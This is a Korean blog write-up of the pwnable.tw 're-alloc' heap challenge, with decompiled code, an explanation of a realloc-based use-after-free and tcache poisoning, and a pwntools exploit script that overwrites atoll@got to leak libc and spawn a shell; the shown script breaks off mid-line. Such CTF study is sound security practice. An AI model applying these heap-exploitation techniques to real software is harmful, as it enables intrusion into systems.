@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang=ko>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="glibc 2.30 은 ubuntu 19.04 이다. 기억하자.. 본 문제의 컨셉은 문제 이름대로 realloc 함수를 이용한 힙 문제이다.  Analysis123456789101112131415161718192021222324252627282930313233343536373839int allocate()&amp;#123;  _BYTE *v0; &#x2F;&#x2F; rax  un">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.tw realloc">
+<meta property="og:url" content="http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/index.html">
+<meta property="og:site_name" content="p0her">
+<meta property="og:description" content="glibc 2.30 은 ubuntu 19.04 이다. 기억하자.. 본 문제의 컨셉은 문제 이름대로 realloc 함수를 이용한 힙 문제이다.  Analysis123456789101112131415161718192021222324252627282930313233343536373839int allocate()&amp;#123;  _BYTE *v0; &#x2F;&#x2F; rax  un">
+<meta property="og:locale" content="ko_KR">
+<meta property="article:published_time" content="2023-05-03T10:22:05.000Z">
+<meta property="article:modified_time" content="2023-05-03T10:50:43.297Z">
+<meta property="article:author" content="p0her">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/mikoto.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/mikoto.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/mikoto.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>pwnable.tw realloc</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-86660611-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/05/02/CVE-2018-4407-oob-write-in-icmp-packet-handling-code/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&text=pwnable.tw realloc"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&title=pwnable.tw realloc"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&is_video=false&description=pwnable.tw realloc"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwnable.tw realloc&body=Check out this article: http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&title=pwnable.tw realloc"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&title=pwnable.tw realloc"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&title=pwnable.tw realloc"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&title=pwnable.tw realloc"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&name=pwnable.tw realloc&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.gosegu.kr/2023/05/03/pwnable-tw-realloc/&t=pwnable.tw realloc"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">1.1.</span> <span class="toc-text">Vulnerability</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        pwnable.tw realloc
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">p0her</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-05-03T10:22:05.000Z" class="dt-published" itemprop="datePublished">2023-05-03</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>glibc 2.30</strong> 은 <strong>ubuntu 19.04</strong> 이다. 기억하자.. 본 문제의 컨셉은 문제 이름대로 <code>realloc</code> 함수를 이용한 힙 문제이다. </p>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">allocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">read_long</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">1</span> || heap[v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">LODWORD</span>(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">    size = <span class="built_in">read_long</span>();</span><br><span class="line">    <span class="keyword">if</span> ( size &lt;= <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="built_in">realloc</span>(<span class="number">0LL</span>, size);</span><br><span class="line">      <span class="keyword">if</span> ( v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        heap[v2] = v4;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">        v0 = (_BYTE *)(heap[v2] + <span class="built_in">read_input</span>(heap[v2], (<span class="type">unsigned</span> <span class="type">int</span>)size));</span><br><span class="line">        *v0 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">LODWORD</span>(v0) = <span class="built_in">puts</span>(<span class="string">&quot;alloc error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">LODWORD</span>(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Too large!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>힙을 할당한 주소를 저장할 위치를 입력받고, 할당할 크기를 <code>0x78</code> 이하로 입력 받는다. 이로 인해 <strong>tcache bin</strong> 만 사용할 수 있다. 그리고 조건에 의해 총 2개의 공간만 사용할 수 있다. 그 후 <code>realloc</code> 첫 번째 인자에 <code>0</code>을 넣고 두 번째 인자에 <code>size</code>를 넣어주는데, <code>realloc</code> 첫 번째 인자에 <code>0</code> 을 넣어주면 <code>__libc_malloc</code> 을 실행하기 때문에 <code>malloc</code>을 사용하게 된다. 그 후 <code>malloc</code>을 통해 리턴 된 공간에 데이터를 입력받게 된다.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_realloc (<span class="type">void</span> *oldmem, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  INTERNAL_SIZE_T nb;         <span class="comment">/* padded request size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *newp;             <span class="comment">/* chunk to return */</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/* realloc of null is supposed to be same as malloc */</span></span><br><span class="line">  <span class="keyword">if</span> (oldmem == <span class="number">0</span>) <span class="comment">// if oldmem is zero</span></span><br><span class="line">    <span class="keyword">return</span> __libc_malloc (bytes);</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">reallocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v1 = <span class="built_in">read_long</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">1</span> || !heap[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  size = <span class="built_in">read_long</span>();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too large!&quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">realloc</span>((<span class="type">void</span> *)heap[v1], size);</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;alloc error&quot;</span>);</span><br><span class="line">  heap[v1] = v3;                               </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read_input</span>(heap[v1], (<span class="type">unsigned</span> <span class="type">int</span>)size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>인덱스를 입력받고 해당 인덱스에 힙 공간이 존재하는지 체크한다. 그 후 <code>size</code> 를 입력받고 해당 <code>size</code> 만큼 힙 공간에 <code>realloc</code> 을 통해 <code>size</code> 만큼 재 할당을 해준다. 그 후 재 할당해준 크기만큼 힙 공간에 데이터를 입력 받는다.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">rfree</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index:&quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">read_long</span>();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">LODWORD</span>(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">realloc</span>((<span class="type">void</span> *)heap[v2], <span class="number">0LL</span>);</span><br><span class="line">    v0 = heap;</span><br><span class="line">    heap[v2] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>인덱스를 입력받고 <code>realloc</code> 두 번째 인자에 <code>0</code> 를 넣어주게 되는데, 이렇게 하면 <code>__libc_free</code> 를 호출해줄 수 있다.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> REALLOC_ZERO_BYTES_FREES</span></span><br><span class="line">  <span class="keyword">if</span> (bytes == <span class="number">0</span> &amp;&amp; oldmem != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_free (oldmem); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>
+<p>그 후 <code>free</code> 한 힙 공간을 0으로 초기화 시켜주어 <code>use after free</code>를 막아준다.</p>
+<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p>취약점은 <code>reallocate</code> 함수에서 발생하는데, <code>size</code>를 넣어줄 때 0인지 아닌지 체크해주지 않아 해당 인덱스에 존재하는 힙 공간을 <code>free</code> 할 수 있고, 초기화도 하지 않아 <code>use after free</code>가 가능하다. 이 취약점과 <code>rfree</code> 함수를 이용하면 <code>double free</code>를 일으킬 수 있는데, <code>glibc 2.30</code> 이라 <code>tcache keys</code> 를 덮는 등 방법이 필요해서 조금 귀찮다. 이 문제에선 그렇게 까지 필요가 없다.</p>
+<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><p>이 문제에선 힙 청크를 출력해주는 등의 행동을 하는 함수가 없기 때문에 libc leak을 할 방법을 생각해봐야 한다. <code>read_long</code> 함수를 실펴보면</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">read_long</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __read_chk(<span class="number">0LL</span>, nptr, <span class="number">16LL</span>, <span class="number">17LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">atoll</span>(nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>atoll(nptr)</code> 부분이 있는데 이 <code>atoll@got</code> 를 <code>printf@plt</code> 로 덮어주면 <code>printf(nptr)</code> 가 되어 포멧스트링 공격이 가능하다. 이를 통해 libc leak이 가능한데, 어떻게 <code>atoll@got</code> 를 덮을지 생각해보지.</p>
+<p><code>realloc</code>의 두 번째 인자에 0을 넣어주면 free가 가능하니, reallocate 함수를 이용해 할당된 힙 청크를 free 해주면, 청크가 저장된 공간을 초기화 하지 않으므로, 이를 재 사용할 수 있고, 다시 reallocate 함수로 해당 인덱스에 재할당하면, <code>fd</code> 를 덮을 수 있다. 그러면 다음에 할당을 하게되면 해당 <code>fd</code>에 할당하게 되고, 이를 got 로 조작하면 got를 덮을 수 있다. 그러면 <code>atoll@got</code>를 <code>printf@plt</code> 로 덮고 포맷스트링 공격을 한 후 다시 <code>atoll@got</code> 를 system 함수로 덮어주고 nptr에 &#96;&#x2F;bin&#x2F;sh’ 을 전달해주면 문제가 클리어 된다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./re-alloc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;0&quot;</span>:</span><br><span class="line">    r = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10106</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">&quot;./re-alloc&quot;</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">idx, size, data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Data:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc</span>(<span class="params">idx, size, data</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        r.sendafter(<span class="string">&quot;Data:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">20</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">20</span>, p64(elf.got[<span class="string">&#x27;atoll&#x27;</span>]))</span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">20</span>, <span class="string">&quot;A&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">100</span> ,<span class="string">&quot;A&quot;</span>*<span class="number">4</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">120</span>, <span class="string">&quot;B&quot;</span>*<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">30</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">30</span>, p64(elf.got[<span class="string">&#x27;atoll&#x27;</span>]))</span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">30</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">50</span>, <span class="string">&quot;A&quot;</span>*<span class="number">4</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">realloc(<span class="number">1</span>, <span class="number">70</span>, <span class="string">&quot;B&quot;</span>*<span class="number">4</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0</span>, <span class="number">40</span>, p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="string">&quot;%23$p&quot;</span>)</span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">235</span></span><br><span class="line">libc_base = __libc_start_main - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">r.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span> ,<span class="string">&quot;A&quot;</span>*<span class="number">10</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;:&quot;</span>, p64(system))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;:&quot;</span> ,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;:&quot;</span>, <span 